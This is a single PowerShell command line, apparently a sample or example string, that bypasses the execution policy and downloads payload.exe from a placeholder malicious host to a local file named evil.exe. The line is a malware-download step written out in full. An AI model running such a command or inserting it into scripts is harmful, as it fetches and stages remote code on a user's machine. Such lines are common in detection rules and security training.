powershell.exe -ExecutionPolicy Bypass -Command 'Invoke-WebRequest -Uri http://malicious.xyz/payload.exe -OutFile C:\temp\evil.exe'
